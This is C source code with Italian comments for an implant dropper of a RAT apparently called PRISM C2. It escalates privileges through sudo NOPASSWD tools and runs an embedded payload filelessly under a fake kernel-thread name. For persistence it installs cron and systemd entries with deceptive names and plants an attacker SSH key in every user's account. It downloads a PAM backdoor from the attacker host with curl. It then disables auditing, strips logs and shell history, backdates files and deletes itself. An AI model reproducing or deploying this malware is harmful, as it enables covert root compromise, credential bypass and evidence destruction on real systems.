/*
 * dropper.c — Single-file implant dropper per PRISM C2
 *
 * Integra in un unico binario:
 *   - Payload PRISM embedded (prism_payload.h, generato con xxd -i)
 *   - Lancio via systemd (istanza unica, no race condition)
 *   - Persistenza 4-layer: cron + systemd + SSH key + PAM backdoor
 *   - Log tampering chirurgico + cleanup uploads
 *   - Self-delete
 *
 * Compilazione:
 *   gcc -O2 -static -o dropper dropper.c
 *
 * MITRE ATT&CK: T1620, T1053.003, T1543.002, T1098.004,
 *               T1070.002, T1070.003, T1027.009
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <pwd.h>

/* ── Payload PRISM embedded ─────────────────────────────────
 * Generato con: python3 -c "..." oppure xxd -i prism_static
 */
#include "prism_payload.h"

/* ── Configurazione ─────────────────────────────────────────*/
#define RAT_PATH     "/usr/lib/systemd/systemd-network-helper"
#define LOCKFILE     "/tmp/.prism.lock"
#define CRON_FILE    "/etc/cron.d/apt-daily-network"
#define SERVICE_NAME "systemd-network-helper"
#define SERVICE_PATH "/etc/systemd/system/systemd-network-helper.service"
#define UPLOADS_DIR  "/var/www/secure_portal/www/uploads"

/* Tool abusabili via sudo NOPASSWD per ottenere root */
static const char *sudo_abusable[] = {
    "python3", "python", "perl", "ruby",
    "vim", "vi", "find", "awk", "bash", "sh",
    "env", "tee", "cp", "chmod", NULL
};

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static char g_kali_ip[64] = {0};

/* ── Debug log su file (/tmp/.dropper_debug) ─────────────────*/
#define DLOG_FILE "/tmp/.dropper_debug"
static FILE *g_dlog = NULL;
static void dlog_init() {
    g_dlog = fopen(DLOG_FILE, "w");
    if (g_dlog) { setvbuf(g_dlog, NULL, _IOLBF, 0); chmod(DLOG_FILE, 0600); }
}
#define DLOG(fmt, ...) do { \
    if (g_dlog) { fprintf(g_dlog, fmt, ##__VA_ARGS__); fflush(g_dlog); } \
} while(0)

/* ══════════════════════════════════════════════════════════
 * PARTE 0 — PRIVILEGE ESCALATION
 * ══════════════════════════════════════════════════════════*/

const char *check_sudo_nopasswd()
{
    FILE *fp = popen("sudo -n -l 2>/dev/null", "r");
    if (!fp) return NULL;

    char buf[1024];
    const char *found = NULL;

    while (fgets(buf, sizeof(buf), fp) && !found) {
        if (!strstr(buf, "NOPASSWD")) continue;
        for (int i = 0; sudo_abusable[i]; i++) {
            if (strstr(buf, sudo_abusable[i])) {
                found = sudo_abusable[i];
                break;
            }
        }
    }
    pclose(fp);
    return found;
}

void try_auto_escalate(int argc, char *argv[])
{
    if (geteuid() == 0) return;

    const char *tool = check_sudo_nopasswd();
    if (!tool) { exit(1); }

    char execv_args[256];
    if (argc >= 2)
        snprintf(execv_args, sizeof(execv_args),
            "['%s','%s']", argv[0], argv[1]);
    else
        snprintf(execv_args, sizeof(execv_args), "['%s']", argv[0]);

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "sudo %s -c \"import os; os.execv('%s', %s)\"",
        tool, argv[0], execv_args);

    system(cmd);
    exit(1);
}

/* ══════════════════════════════════════════════════════════
 * PARTE 1 — ESECUZIONE FILELESS
 * ══════════════════════════════════════════════════════════*/

static int do_memfd_create(const char *name, unsigned int flags)
{
    return (int)syscall(SYS_memfd_create, name, flags);
}

void launch_prism_fileless()
{
    DLOG("[*] launch_prism_fileless\n");

    /* Pulisce eventuale lockfile stale */
    FILE *lf = fopen(LOCKFILE, "r");
    if (lf) {
        int old_pid = 0;
        fscanf(lf, "%d", &old_pid);
        fclose(lf);
        char pp[64];
        snprintf(pp, sizeof(pp), "/proc/%d", old_pid);
        if (access(pp, F_OK) != 0) {
            unlink(LOCKFILE);
            DLOG("[*] lockfile stale rimosso (PID %d morto)\n", old_pid);
        } else {
            DLOG("[!] PRISM gia' in esecuzione (PID %d) — skip launch\n", old_pid);
            return;
        }
    }

    int fd = do_memfd_create("", MFD_CLOEXEC);
    if (fd < 0) { DLOG("[!] memfd_create: errno=%d\n", errno); return; }

    size_t written = 0;
    while (written < _binary_prism_static_len) {
        ssize_t w = write(fd,
            _binary_prism_static + written,
            _binary_prism_static_len - written);
        if (w < 0) { DLOG("[!] write memfd: errno=%d\n", errno); close(fd); return; }
        written += (size_t)w;
    }

    pid_t pid = fork();
    if (pid < 0) { DLOG("[!] fork: errno=%d\n", errno); close(fd); return; }

    if (pid == 0) {
        setsid();
        char *argv_prism[] = {
            "[kworker/0:0]",
            g_kali_ip,
            NULL
        };
        extern char **environ;
        fexecve(fd, argv_prism, environ);
        _exit(1);
    }

    close(fd);
    sleep(1);
    DLOG("[+] PRISM avviato fileless PID=%d\n", pid);
}

/* ══════════════════════════════════════════════════════════
 * PARTE 2 — PERSISTENZA
 * ══════════════════════════════════════════════════════════*/

int install_rat_binary()
{
    DLOG("[*] install_rat_binary: len=%zu\n", (size_t)_binary_prism_static_len);

    system("mkdir -p /usr/lib/systemd/ 2>/dev/null");

    /* Termina eventuale istanza che tiene il file busy */
    system("pkill -f 'kworker/0:0.*192\\.168\\.' 2>/dev/null; sleep 1");
    unlink(RAT_PATH);  /* rimuovi prima di riscrivere */

    int fd = open(RAT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) {
        DLOG("[!] open(%s) fallito: errno=%d (%s)\n", RAT_PATH, errno, strerror(errno));
        return -1;
    }

    size_t written = 0;
    while (written < _binary_prism_static_len) {
        ssize_t w = write(fd,
            _binary_prism_static + written,
            _binary_prism_static_len - written);
        if (w < 0) {
            DLOG("[!] write fallito a offset %zu: errno=%d\n", written, errno);
            close(fd); return -1;
        }
        written += (size_t)w;
    }
    close(fd);
    chmod(RAT_PATH, 0755);

    DLOG("[+] Binario installato: %s (%zu bytes)\n",
           RAT_PATH, (size_t)_binary_prism_static_len);
    return 0;
}

/* Layer 1: Cron job — T1053.003 */
int install_cron()
{
    FILE *f = fopen(CRON_FILE, "w");
    if (!f) { DLOG("[!] Cron: errno=%d (%s)\n", errno, strerror(errno)); return -1; }

    fprintf(f, "# Debian network management service\n");
    fprintf(f, "@reboot root rm -f %s\n", LOCKFILE);
    fprintf(f, "*/5 * * * * root pgrep -f \"%s\""
               " > /dev/null || %s %s &\n",
               RAT_PATH, RAT_PATH, g_kali_ip);
    fclose(f);
    chmod(CRON_FILE, 0644);
    system("touch -t 202301010000 " CRON_FILE " 2>/dev/null");

    DLOG("[+] Cron: %s\n", CRON_FILE);
    return 0;
}

/* Layer 2: Systemd service — T1543.002 */
int install_systemd()
{
    FILE *f = fopen(SERVICE_PATH, "w");
    if (!f) { DLOG("[!] Systemd: errno=%d (%s)\n", errno, strerror(errno)); return -1; }

    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=Network Management Helper\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "ExecStartPre=/bin/rm -f %s\n", LOCKFILE);
    fprintf(f, "ExecStart=%s %s\n", RAT_PATH, g_kali_ip);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=60\n");
    fprintf(f, "StandardOutput=null\n");
    fprintf(f, "StandardError=null\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    fclose(f);

    chmod(SERVICE_PATH, 0644);
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable " SERVICE_NAME " 2>/dev/null");
    system("touch -t 202301010000 " SERVICE_PATH " 2>/dev/null");

    DLOG("[+] Systemd service: %s\n", SERVICE_NAME);
    return 0;
}

/* Layer 3: SSH authorized_keys — T1098.004 */
int install_ssh_key()
{
    const char *pubkey =
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCRTQ9SWUg55oBG"
        "ebbJJbdz2fVm1UMxnE8TaYJ2D3Wn81iKwCKRNfvtpptsMeoSXBe"
        "Jq2Wz32gFEQ3b5u/Z6PMx81GSfMDgxOBnSdkgYlUG/iNPjFMmKZ"
        "OqOk+GD54GJHZUACU2uwKnpNiNJ1JeFdYROA5bFxdcrR2ZI/vMl7"
        "H4teUBDlZPN0ennlH0B7kBoViOry5b6iC0UDGpG2DI3xsR/4g2Ok"
        "UwOkgNq1cTZxMGkOrxqGhV4LIMxOMPknGXJLaNdp7MOxZaInsUH9"
        "vMnecCs6qNYIiNv7HeDCdn2KaloFhvMj8rJz0wEQLpr9vu6YUzvMD"
        "6akV51iAOe/Rbh7xbf0AHuTBXGdWrBjvt2WaYPm2dd04qoPUMJ/p"
        "DbwjnTf+CSlHhL5ftyNcwsEa8xUHdq9Zb49RHdYA8uv4Qi8GxYMW"
        "8HRpkfv8B8ux0otxgIIRy88lb3iWjaJNYyCRSsHvqZB3CAEcPzE1"
        "G4na9pHu0//JrJu0KfBEFlcNbIvipB7OHBz4NOWahT+YCeLSOtL1"
        "RFJ5ZB4FsQFbrdiuw4fL2ibr1Xtiv42MFeykrKaP/5KTHLxL2T8K"
        "mA+f6AR5r5t/KdNDAsctIrm34ZKtDexaXVigbfy3KSi4e0PVmX/U"
        "u1/YEXy8HzbMqm3tGqqSaF2QKJrwLf5iQLQz3naphUOw3ew== kali@kali";

    FILE *pf = fopen("/etc/passwd", "r");
    if (!pf) return -1;

    char line[512];
    while (fgets(line, sizeof(line), pf)) {
        char uname[64], home[256];
        int uid, gid;
        if (sscanf(line, "%63[^:]:%*[^:]:%d:%d:%*[^:]:%255[^:]:%*s",
                   uname, &uid, &gid, home) < 4) continue;
        if (uid != 0 && uid < 1000) continue;
        if (home[0] == '\0' || strcmp(home, "/nonexistent") == 0) continue;

        char ssh_dir[320], auth_keys[384];
        snprintf(ssh_dir,   sizeof(ssh_dir),   "%s/.ssh", home);
        snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);

        mkdir(ssh_dir, 0700);
        chown(ssh_dir, (uid_t)uid, (gid_t)gid);

        FILE *check = fopen(auth_keys, "r");
        if (check) {
            char kline[512]; int found = 0;
            while (fgets(kline, sizeof(kline), check))
                if (strstr(kline, "kali@kali")) { found = 1; break; }
            fclose(check);
            if (found) continue;
        }

        FILE *f = fopen(auth_keys, "a");
        if (f) {
            fprintf(f, "\n%s\n", pubkey);
            fclose(f);
            chmod(auth_keys, 0600);
            chown(auth_keys, (uid_t)uid, (gid_t)gid);
            DLOG("[+] SSH key installata per %s\n", uname);
        }
    }
    fclose(pf);
    return 0;
}

/* Layer 4: PAM backdoor — T1556.003 */
int install_pam_backdoor()
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "/usr/bin/curl -s http://%s/persistence/pam_backdoor.so "
        "-o /lib/x86_64-linux-gnu/security/pam_backdoor.so",
        g_kali_ip);

    if (system(cmd) != 0 ||
        access("/lib/x86_64-linux-gnu/security/pam_backdoor.so", F_OK) != 0) {
        DLOG("[!] PAM module non scaricato — skip\n");
        return -1;
    }
    chmod("/lib/x86_64-linux-gnu/security/pam_backdoor.so", 0644);

    const char *pam_configs[] = {
        "/etc/pam.d/sshd", "/etc/pam.d/login",
        "/etc/pam.d/su",   "/etc/pam.d/sudo", NULL
    };
    for (int i = 0; pam_configs[i]; i++) {
        if (access(pam_configs[i], F_OK) != 0) continue;
        char grep_cmd[256];
        snprintf(grep_cmd, sizeof(grep_cmd),
                 "grep -q pam_backdoor.so %s", pam_configs[i]);
        if (system(grep_cmd) == 0) continue;
        char sed_cmd[512];
        snprintf(sed_cmd, sizeof(sed_cmd),
                 "sed -i '1s/^/auth\\tsufficient\\tpam_backdoor.so\\n/' %s",
                 pam_configs[i]);
        system(sed_cmd);
        DLOG("[+] PAM backdoor aggiunta a %s\n", pam_configs[i]);
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════
 * PARTE 3 — LOG TAMPERING
 * ══════════════════════════════════════════════════════════*/

void disable_audit_for_rat()
{
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "auditctl -a never,exit -F path=%s 2>/dev/null", RAT_PATH);
    system(cmd);
    DLOG("[+] auditctl configurato\n");
}

void clean_text_logs()
{
    const char *files[] = {
        "/var/log/auth.log", "/var/log/syslog",
        "/var/log/messages", "/var/log/kern.log",
        "/var/log/daemon.log", "/var/log/dpkg.log",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/apache2/portal_ssl_access.log",
        "/var/log/apache2/portal_ssl_error.log",
        NULL
    };
    const char *pats[] = {
        g_kali_ip, "systemd-network-helper",
        "shell.php", "memfd_loader", "prism_static",
        "persistence_prism", "log_tamper", "dropper",
        NULL
    };

    for (int i = 0; files[i]; i++) {
        for (int j = 0; pats[j]; j++) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd),
                "sed -i '/%s/d' '%s' 2>/dev/null",
                pats[j], files[i]);
            system(cmd);
        }
    }
    DLOG("[+] Text logs puliti\n");
}

void clean_audit_logs()
{
    const char *pats[] = {
        g_kali_ip, "systemd-network-helper",
        "dropper", "prism_static", NULL
    };
    const char *afiles[] = {
        "/var/log/audit/audit.log",
        "/var/log/audit/audit.log.1", NULL
    };
    for (int i = 0; afiles[i]; i++)
        for (int j = 0; pats[j]; j++) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd),
                "sed -i '/%s/d' '%s' 2>/dev/null",
                pats[j], afiles[i]);
            system(cmd);
        }
    DLOG("[+] Audit logs puliti\n");
}

void clean_bash_history()
{
    const char *pats[] = {
        g_kali_ip, "dropper", "prism_static", "memfd_loader",
        "persistence_prism", "log_tamper", "shell.php",
        "systemd-network-helper", "/var/www/html/uploads", NULL
    };
    const char *hfiles[] = {
        "/root/.bash_history",
        "/home/debian/.bash_history",
        "/home/www-data/.bash_history", NULL
    };
    for (int i = 0; hfiles[i]; i++)
        for (int j = 0; pats[j]; j++) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd),
                "sed -i '/%s/d' '%s' 2>/dev/null",
                pats[j], hfiles[i]);
            system(cmd);
        }
    system("history -c 2>/dev/null");
    DLOG("[+] Bash history pulita\n");
}

void clean_login_logs()
{
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "utmpdump /var/log/wtmp 2>/dev/null | grep -v '%s' | "
        "utmpdump -r > /tmp/.wtmp_clean 2>/dev/null && "
        "mv /tmp/.wtmp_clean /var/log/wtmp 2>/dev/null",
        g_kali_ip);
    system(cmd);
    DLOG("[+] wtmp pulito\n");
}

void spoof_timestamps()
{
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "touch -t 202301010000 %s 2>/dev/null", RAT_PATH);
    system(cmd);
    system("touch -t 202301010000 " CRON_FILE    " 2>/dev/null");
    system("touch -t 202301010000 " SERVICE_PATH " 2>/dev/null");
    DLOG("[+] Timestamp spoofati (2023-01-01)\n");
}

/* Svuota la directory uploads/ — con DLOG per ogni errore */
void clean_uploads()
{
    DLOG("[*] clean_uploads: %s\n", UPLOADS_DIR);
    DIR *d = opendir(UPLOADS_DIR);
    if (!d) {
        DLOG("[!] opendir fallita: errno=%d (%s)\n", errno, strerror(errno));
        return;
    }

    struct dirent *e;
    char fp[512];
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.') continue;
        snprintf(fp, sizeof(fp), "%s/%s", UPLOADS_DIR, e->d_name);
        if (unlink(fp) == 0)
            DLOG("[+] Rimosso: %s\n", fp);
        else
            DLOG("[!] unlink(%s) fallito: errno=%d (%s)\n",
                 fp, errno, strerror(errno));
    }
    closedir(d);
    DLOG("[+] clean_uploads completato\n");
}

/* ══════════════════════════════════════════════════════════
 * PARTE 4 — SELF-DELETE
 * ══════════════════════════════════════════════════════════*/

void self_delete(const char *self_path)
{
    /* Usa path assoluto ricavato da /proc/self/exe per sicurezza */
    char abs_path[512] = {0};
    ssize_t n = readlink("/proc/self/exe", abs_path, sizeof(abs_path) - 1);
    if (n > 0) {
        abs_path[n] = '\0';
    } else {
        /* Fallback al path passato */
        strncpy(abs_path, self_path, sizeof(abs_path) - 1);
    }

    pid_t pid = fork();
    if (pid == 0) {
        sleep(2);
        unlink(abs_path);
        /* Rimuovi anche il debug log */
        unlink(DLOG_FILE);
        _exit(0);
    }
    DLOG("[+] Self-delete programmato: %s\n", abs_path);
}

/* ══════════════════════════════════════════════════════════
 * MAIN
 * ══════════════════════════════════════════════════════════*/

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Uso: %s <kali_ip>\n", argv[0]);
        return 1;
    }
    strncpy(g_kali_ip, argv[1], sizeof(g_kali_ip) - 1);

    /* 0. Privesc automatica se non siamo root */
    try_auto_escalate(argc, argv);

    dlog_init();
    DLOG("=== PRISM Dropper ===\n");
    DLOG("[*] C2: %s | UID: %d\n\n", g_kali_ip, (int)getuid());

    /* 1. Installa binario PRISM su disco (con kill del vecchio) */
    DLOG("[*] Step 1: install_rat_binary\n");
    int r1 = install_rat_binary();
    DLOG("[*] install_rat_binary -> %d\n", r1);

    /* 2. Installa persistenza 4-layer */
    DLOG("[*] Step 2: install_cron\n");
    install_cron();
    DLOG("[*] Step 2b: install_systemd\n");
    install_systemd();
    DLOG("[*] Step 2c: install_ssh_key\n");
    install_ssh_key();
    DLOG("[*] Step 2d: install_pam_backdoor\n");
    install_pam_backdoor();

    /* 3. Pulisce uploads PRIMA di avviare PRISM
     * (dropper.jpg è ancora su disco, non in esecuzione da fexecve) */
    DLOG("[*] Step 3: clean_uploads\n");
    clean_uploads();

    /* 4. Avvia PRISM fileless */
    DLOG("[*] Step 4: launch_prism_fileless\n");
    launch_prism_fileless();

    /* 5. Disabilita audit per il RAT */
    DLOG("[*] Step 5: disable_audit_for_rat\n");
    disable_audit_for_rat();

    /* 6. Rimuove tracce dai log */
    DLOG("[*] Step 6: clean_text_logs\n");
    clean_text_logs();
    clean_audit_logs();
    clean_bash_history();
    clean_login_logs();

    /* 7. Spoofa timestamp file di persistenza */
    DLOG("[*] Step 7: spoof_timestamps\n");
    spoof_timestamps();

    /* 8. Self-delete + cleanup debug log */
    DLOG("[*] Step 8: self_delete\n");
    if (g_dlog) { fclose(g_dlog); g_dlog = NULL; }
    self_delete(argv[0]);

    _exit(0);
}
